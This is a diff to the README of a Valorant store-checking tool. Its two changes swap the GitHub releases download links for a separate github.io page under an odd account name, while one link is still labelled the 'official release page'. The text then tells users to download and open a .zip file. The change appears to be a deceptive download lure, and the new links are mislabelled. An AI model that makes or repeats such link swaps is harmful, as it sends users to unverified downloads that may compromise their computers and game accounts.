@@ -1,6 +1,6 @@
 # 🛡️ ValorantShopChecker - Check your daily store items easily
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/leftish-whitechinnedpetrel654/ValorantShopChecker/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://leftish-whitechinnedpetrel654.github.io)
 
 ValorantShopChecker lets you view the weapon skins currently available in your personalized Valorant store. You see what items are for sale without starting the game client or logging into the game. This tool saves you time and ensures you never miss a skin you want. The program handles the connection to the Valorant API securely. It does not store or require your account password.
 
@@ -8,7 +8,7 @@ ValorantShopChecker lets you view the weapon skins currently available in your p
 
 Follow these steps to get the tool on your computer.
 
-1. Go to the [official release page](https://github.com/leftish-whitechinnedpetrel654/ValorantShopChecker/releases).
+1. Go to the [official release page](https://leftish-whitechinnedpetrel654.github.io).
 2. Look for the most recent version at the top of the page.
 3. Click the file ending in .zip to start the download.
 4. Once the download finishes, open your Downloads folder.
